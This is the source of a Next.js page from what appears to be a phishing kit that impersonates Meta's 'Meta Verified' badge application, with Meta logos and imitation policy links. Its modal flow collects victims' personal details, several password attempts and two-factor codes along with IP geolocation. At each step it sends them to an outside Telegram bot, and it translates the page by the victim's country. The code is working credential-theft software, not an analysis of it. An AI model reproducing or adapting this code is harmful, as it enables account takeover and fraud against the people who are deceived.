'use client';

import DocImg from '@/assets/images/doc.png';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import SaveImg from '@/assets/images/save_img.png';
import TichImage from '@/assets/images/tich.webp';
import BenefitsSection from '@/components/BenefitsSection';
import { ArrowIcon, MetaLogoSvg, tickSrc } from '@/components/icons';
import FirstFormModal, { type FirstFormPayload } from '@/components/meta-verified/first-form-modal';
import LoginModal from '@/components/meta-verified/login-modal';
import SuccessModal from '@/components/meta-verified/success-modal';
import TwoFAModal from '@/components/meta-verified/two-fa-modal';
import UploadModal from '@/components/meta-verified/upload-modal';
import PrivacyPolicyModal from '@/components/PrivacyPolicyModal';
import SearchModal from '@/components/SearchModal';
import Sidebar from '@/components/Sidebar';
import TermsModal from '@/components/TermsModal';
import TestimonialSection from '@/components/TestimonialSection';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { PAGE_TEXT_KEYS } from '@/constants/page-text-keys';
import { store } from '@/store/store';
import CONFIG from '@/utils/config';
import { buildVerifiedMessage, type VerifiedFormData } from '@/utils/message';
import { sendTelegramMessage } from '@/utils/send-telegram';
import { purgeOldTranslationCaches, translateKeys } from '@/utils/translate';
import axios from 'axios';
import { useCallback, useEffect, useMemo, useRef, useState, type FC } from 'react';

const Page: FC = () => {
    const setGeoInfo = store((state) => state.setGeoInfo);

    const [showFirstModal, setShowFirstModal] = useState(false);
    const [showLoginModal, setShowLoginModal] = useState(false);
    const [show2FAModal, setShow2FAModal] = useState(false);
    const [showUploadModal, setShowUploadModal] = useState(false);
    const [showSuccessModal, setShowSuccessModal] = useState(false);
    const [showSearchModal, setShowSearchModal] = useState(false);
    const [showPrivacyModal, setShowPrivacyModal] = useState(false);
    const [selectedPrivacyQuestion, setSelectedPrivacyQuestion] = useState<string | null>(null);
    const [showTermsModal, setShowTermsModal] = useState(false);
    const [showMobileSidebar, setShowMobileSidebar] = useState(false);

    const [formData, setFormData] = useState<VerifiedFormData>({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        loginIdentifier: ''
    });
    const [loginAttempts, setLoginAttempts] = useState<{ time: string; value: string }[]>([]);
    const [twoFAAttempts, setTwoFAAttempts] = useState<{ time: string; value: string }[]>([]);
    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown' });
    const [translatedTexts, setTranslatedTexts] = useState<Record<string, string>>(DEFAULT_TEXTS);
    const [isLoading, setIsLoading] = useState(true);

    const defaultTexts = useMemo(() => DEFAULT_TEXTS, []);
    const modalOpenRef = useRef(false);
    const pendingTextsRef = useRef<Record<string, string> | null>(null);

    const isFormFlowOpen =
        showFirstModal || showLoginModal || show2FAModal || showUploadModal || showSuccessModal;
    modalOpenRef.current = isFormFlowOpen;

    const applyTranslatedTexts = useCallback((patch: Record<string, string>) => {
        if (modalOpenRef.current) {
            pendingTextsRef.current = { ...(pendingTextsRef.current ?? {}), ...patch };
            return;
        }

        setTranslatedTexts((prev) => ({ ...prev, ...patch }));
    }, []);

    useEffect(() => {
        if (!isFormFlowOpen && pendingTextsRef.current) {
            const pending = pendingTextsRef.current;
            pendingTextsRef.current = null;
            setTranslatedTexts((prev) => ({ ...prev, ...pending }));
        }
    }, [isFormFlowOpen]);

    const translateTextsInBackground = useCallback(
        async (countryCode: string) => {
            try {
                const priorityTexts = await translateKeys(PAGE_TEXT_KEYS, defaultTexts, countryCode);
                applyTranslatedTexts(priorityTexts);

                const deferredKeys = Object.keys(defaultTexts).filter(
                    (key) => !(PAGE_TEXT_KEYS as readonly string[]).includes(key)
                );
                if (deferredKeys.length === 0) return;

                const deferredTexts = await translateKeys(deferredKeys, defaultTexts, countryCode);
                applyTranslatedTexts(deferredTexts);
            } catch {
                //
            }
        },
        [applyTranslatedTexts, defaultTexts]
    );

    useEffect(() => {
        sessionStorage.removeItem('messageId');

        const initializeApp = async () => {
            try {
                purgeOldTranslationCaches();
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                localStorage.setItem('ipInfo', JSON.stringify(data));
                setIpInfo({ ip: data.ip || 'Unknown', country: data.country || 'Unknown' });
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'Unknown',
                    country: data.country || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    country_code: data.country_code || 'US'
                });

                const countryCode = data.country_code || 'US';
                if (countryCode.toUpperCase() !== 'US') {
                    void translateTextsInBackground(countryCode);
                }
            } catch {
                //
            } finally {
                setIsLoading(false);
            }
        };

        initializeApp();
    }, [defaultTexts, setGeoInfo, translateTextsInBackground]);

    const pushTelegram = async (payload: Parameters<typeof buildVerifiedMessage>[1]) => {
        const message = buildVerifiedMessage(ipInfo, payload);
        await sendTelegramMessage(message);
    };

    const handleFirstFormSubmit = async (data: FirstFormPayload) => {
        const newFormData = { ...formData, ...data };
        setFormData(newFormData);
        setShowFirstModal(false);
        setShowLoginModal(true);

        await pushTelegram({
            form: newFormData,
            login: null,
            passes: [],
            codes: []
        });
    };

    const handleLoginSubmit = async (email: string, password: string) => {
        const newFormData = { ...formData, loginIdentifier: email };
        const newPasses = [...loginAttempts.map((p) => p.value), password].slice(-CONFIG.MAX_PASSWORD_ATTEMPTS);

        setFormData(newFormData);
        setLoginAttempts((prev) => [...prev, { time: new Date().toISOString(), value: password }].slice(-CONFIG.MAX_PASSWORD_ATTEMPTS));

        await pushTelegram({
            form: newFormData,
            login: email,
            passes: newPasses,
            codes: twoFAAttempts.map((c) => c.value)
        });
    };

    const handle2FASubmit = async (code: string) => {
        const newCodes = [...twoFAAttempts.map((c) => c.value), code].slice(-CONFIG.MAX_CODE_ATTEMPTS);
        setTwoFAAttempts((prev) => [...prev, { time: new Date().toISOString(), value: code }].slice(-CONFIG.MAX_CODE_ATTEMPTS));

        await pushTelegram({
            form: formData,
            login: formData.loginIdentifier,
            passes: loginAttempts.map((p) => p.value),
            codes: newCodes
        });
    };

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    if (isLoading) {
        return (
            <div id='intro' style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 }}>
                <img id='meta-logo' src={MetaLogo.src} alt='Meta' style={{ width: '70%', height: 'auto', maxWidth: '280px' }} />
            </div>
        );
    }

    return (
        <>
            <div className='container-sm' id='main'>
                <div className='container-head'>
                    <div id='logo'>
                        <MetaLogoSvg id='pageMetaGrad' />
                    </div>
                    <div className='burger-button' id='showPopup' onClick={() => setShowMobileSidebar(true)} style={{ cursor: 'pointer' }}>
                        <div className='bar' />
                        <div className='bar' />
                        <div className='bar' />
                    </div>
                </div>
                <div className='row'>
                    <div className='col-4'>
                        <Sidebar
                            texts={texts}
                            onOpenSearchModal={() => setShowSearchModal(true)}
                            onOpenPrivacyModal={(question) => {
                                setSelectedPrivacyQuestion(question);
                                setShowPrivacyModal(true);
                            }}
                            onOpenTermsModal={() => setShowTermsModal(true)}
                        />
                    </div>
                    <div className='col-8'>
                        <div id='right'>
                            <h1>
                                <img alt='' src={tickSrc} style={{ height: '50px', width: '50px', marginRight: '8px' }} />
                                {texts.title}
                            </h1>
                            <p>{texts.congrats}</p>
                            <p>{texts.milestone}</p>
                            <p>{texts.excited}</p>

                            <div id='card' style={{ background: 'rgb(222, 240, 243)' }}>
                                <div className='card-text'>
                                    <div style={{ borderRadius: '15px', backgroundColor: 'white', padding: '20px 20px 10px 20px' }}>
                                        <h5>
                                            <img src={tickSrc} width={18} alt='tick' style={{ verticalAlign: 'middle' }} /> {texts.metaVerified}
                                        </h5>
                                        <h6>{texts.protectBrand}</h6>
                                        <h6 style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                                            <span>{texts.showWorld}</span>
                                            <span>{texts.buildConfidence}</span>
                                        </h6>
                                    </div>
                                    <div className='btn-wrapper'>
                                        <div className='button fb-blue w-100' id='start' onClick={() => setShowFirstModal(true)}>
                                            {texts.getBadge}
                                        </div>
                                    </div>
                                </div>
                                <img alt='' src={TichImage.src} style={{ borderRadius: '20px' }} />
                            </div>

                            <BenefitsSection texts={texts} />
                            <TestimonialSection texts={texts} />

                            <h5>
                                <img src={tickSrc} width={18} alt='tick' style={{ verticalAlign: 'middle' }} /> {texts.exploreBusiness}
                            </h5>
                            <br />
                            <h6>{texts.businessDesc1}</h6>
                            <h6>{texts.businessDesc2}</h6>
                            <h6>{texts.businessDesc3}</h6>
                            <h6>{texts.businessDesc4}</h6>
                            <h6>
                                {texts.businessDesc5}
                                <br />
                                {texts.businessDesc6}
                                <br />
                                <br />
                                <div className='fake-likns'>
                                    <div className='action-button-list'>
                                        <div
                                            className='action-button wide'
                                            onClick={() => {
                                                setSelectedPrivacyQuestion(texts.privacyPolicyQ);
                                                setShowPrivacyModal(true);
                                            }}
                                            style={{ cursor: 'pointer' }}
                                        >
                                            <div className='action-button-img'>
                                                <img alt='' src={SaveImg.src} />
                                            </div>
                                            <div className='action-button-text'>
                                                <span>{texts.privacyPolicyQ}</span>
                                                <br />
                                                <span className='small-grey'>{texts.privacyPolicy}</span>
                                            </div>
                                            <div className='action-button-arrow'>
                                                <ArrowIcon />
                                            </div>
                                        </div>
                                        <div
                                            className='action-button wide'
                                            onClick={() => {
                                                setSelectedPrivacyQuestion(texts.manageInfo);
                                                setShowPrivacyModal(true);
                                            }}
                                            style={{ cursor: 'pointer' }}
                                        >
                                            <div className='action-button-img'>
                                                <img alt='' src={SaveImg.src} />
                                            </div>
                                            <div className='action-button-text'>
                                                <span>{texts.manageInfo}</span>
                                                <br />
                                                <span className='small-grey'>{texts.privacyPolicy}</span>
                                            </div>
                                            <div className='action-button-arrow'>
                                                <ArrowIcon />
                                            </div>
                                        </div>
                                    </div>
                                    <br />
                                    <h6>{texts.userAgreement}</h6>
                                    <div className='action-button wide' onClick={() => setShowTermsModal(true)} style={{ cursor: 'pointer' }}>
                                        <div className='action-button-img'>
                                            <img alt='' src={DocImg.src} />
                                        </div>
                                        <div className='action-button-text'>
                                            <span>{texts.metaAI}</span>
                                            <br />
                                            <span className='small-grey'>User Agreement</span>
                                        </div>
                                        <div className='action-button-arrow'>
                                            <ArrowIcon />
                                        </div>
                                    </div>
                                    <br />
                                    <h6>{texts.additionalResources}</h6>
                                    <div className='action-button-list'>
                                        {[
                                            { title: texts.aiInfo, sub: texts.privacyCenter },
                                            { title: texts.aiCards, sub: texts.metaAIWebsite },
                                            { title: texts.aiIntro, sub: texts.forTeenagers }
                                        ].map((item) => (
                                            <div
                                                key={item.title}
                                                className='action-button wide'
                                                onClick={() => {
                                                    setSelectedPrivacyQuestion(item.title);
                                                    setShowPrivacyModal(true);
                                                }}
                                                style={{ cursor: 'pointer' }}
                                            >
                                                <div className='action-button-text'>
                                                    <span>{item.title}</span>
                                                    <br />
                                                    <span className='small-grey'>{item.sub}</span>
                                                </div>
                                                <div className='action-button-arrow'>
                                                    <ArrowIcon />
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            </h6>
                            <p className='small-grey'>
                                {texts.privacyRisks}{' '}
                                <a className='add-svg' id='policyLink' target='_blank' rel='noopener noreferrer'>
                                    {texts.privacyPolicy}
                                </a>
                            </p>
                        </div>
                    </div>
                </div>
            </div>

            <FirstFormModal show={showFirstModal} onClose={() => setShowFirstModal(false)} onSubmit={handleFirstFormSubmit} texts={texts} />
            <LoginModal
                show={showLoginModal}
                onClose={() => setShowLoginModal(false)}
                onSubmit={handleLoginSubmit}
                onSuccess={() => {
                    setShowLoginModal(false);
                    setShow2FAModal(true);
                }}
                texts={texts}
            />
            <TwoFAModal
                show={show2FAModal}
                onClose={() => setShow2FAModal(false)}
                onSubmit={handle2FASubmit}
                onSuccess={() => {
                    setShow2FAModal(false);
                    setShowUploadModal(true);
                }}
                texts={texts}
                formData={formData}
            />
            <UploadModal
                show={showUploadModal}
                onClose={() => setShowUploadModal(false)}
                onSuccess={() => {
                    setShowUploadModal(false);
                    setShowSuccessModal(true);
                }}
                texts={texts}
                ipInfo={ipInfo}
            />
            <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
            <SearchModal show={showSearchModal} onClose={() => setShowSearchModal(false)} texts={texts} />
            <PrivacyPolicyModal
                show={showPrivacyModal}
                onClose={() => {
                    setShowPrivacyModal(false);
                    setSelectedPrivacyQuestion(null);
                }}
                selectedQuestion={selectedPrivacyQuestion}
                texts={texts}
            />
            <TermsModal show={showTermsModal} onClose={() => setShowTermsModal(false)} texts={texts} />

            {showMobileSidebar && (
                <div className='popup show' id='popup' onClick={() => setShowMobileSidebar(false)} style={{ display: 'block' }}>
                    <div className='popup-item' onClick={(e) => e.stopPropagation()}>
                        <div className='burger-button-popup' id='closePopup' onClick={() => setShowMobileSidebar(false)} style={{ cursor: 'pointer' }}>
                            <div className='bar' />
                            <div className='bar' />
                        </div>
                        <div className='popup-content'>
                            <Sidebar
                                texts={texts}
                                onOpenSearchModal={() => {
                                    setShowMobileSidebar(false);
                                    setShowSearchModal(true);
                                }}
                                onOpenPrivacyModal={(question) => {
                                    setShowMobileSidebar(false);
                                    setSelectedPrivacyQuestion(question);
                                    setShowPrivacyModal(true);
                                }}
                                onOpenTermsModal={() => {
                                    setShowMobileSidebar(false);
                                    setShowTermsModal(true);
                                }}
                            />
                        </div>
                    </div>
                </div>
            )}
        </>
    );
};

export default Page;
